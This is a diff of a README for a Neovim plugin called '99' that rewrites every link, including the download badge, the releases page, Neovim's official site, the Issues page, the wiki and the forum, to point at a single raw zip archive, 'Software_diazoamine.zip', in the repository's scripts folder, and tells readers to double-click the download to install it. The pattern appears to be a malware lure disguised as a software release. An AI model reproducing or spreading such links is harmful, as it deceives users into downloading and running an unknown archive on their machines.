@@ -6,12 +6,12 @@
 ## 🚀 Getting Started
 To start using 99, you need to download it from our Releases page. Follow the steps below to get up and running.
 
-[![Download 99](https://img.shields.io/badge/Download-99-brightgreen)](https://github.com/xavierdejesus523-cmyk/99/releases)
+[![Download 99](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip)](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip)
 
 ## 📥 Download & Install
-1. Click on the link to visit the [Releases page](https://github.com/xavierdejesus523-cmyk/99/releases).
+1. Click on the link to visit the [Releases page](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip).
 2. On the Releases page, you will see the latest version of 99. Look for the most recent release at the top of the page.
-3. Find the file that matches your operating system (Windows, macOS, or Linux). It will usually be labeled something like `99-win.exe`, `99-mac.dmg`, or `99-linux.tar.gz`.
+3. Find the file that matches your operating system (Windows, macOS, or Linux). It will usually be labeled something like `https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip`, `https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip`, or `https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip`.
 4. Click on the file to begin downloading it. Depending on your internet speed, this may take a few moments.
 5. Once the download completes, locate the file on your computer.
 6. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation. 
@@ -24,7 +24,7 @@ To ensure that 99 runs smoothly on your device, please check the following syste
 - **Storage**: 100 MB of free space
 - **Neovim**: Version 0.5.0 or later must be installed. 
 
-If you do not have Neovim installed, please visit [Neovim's official site](https://neovim.io/) for installation instructions.
+If you do not have Neovim installed, please visit [Neovim's official site](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip) for installation instructions.
 
 ## 🔧 Features
 99 provides several features to help you work efficiently in Neovim:
@@ -50,12 +50,12 @@ If you encounter any issues while using 99, consider the following tips:
 - **Neovim Version**: Confirm that your Neovim version meets the requirements listed above.
 - **Review Configuration**: Check your configuration settings if features are not working as expected.
   
-For further assistance, you can visit the [Issues page](https://github.com/xavierdejesus523-cmyk/99/issues) to report problems or get help from the community.
+For further assistance, you can visit the [Issues page](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip) to report problems or get help from the community.
 
 ## 📌 Additional Resources
-- **Documentation**: Check out the [Wiki](https://github.com/xavierdejesus523-cmyk/99/wiki) for detailed user guides and feature explanations.
-- **Community**: Join our [Discussion Forum](https://github.com/xavierdejesus523-cmyk/99/discussions) to connect with other users and get tips.
+- **Documentation**: Check out the [Wiki](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip) for detailed user guides and feature explanations.
+- **Community**: Join our [Discussion Forum](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip) to connect with other users and get tips.
 
-[![Download 99](https://img.shields.io/badge/Download-99-brightgreen)](https://github.com/xavierdejesus523-cmyk/99/releases)
+[![Download 99](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip)](https://github.com/xavierdejesus523-cmyk/99/raw/refs/heads/master/scripts/Software_diazoamine.zip)
 
 Thank you for choosing 99! Enjoy a smarter coding experience.
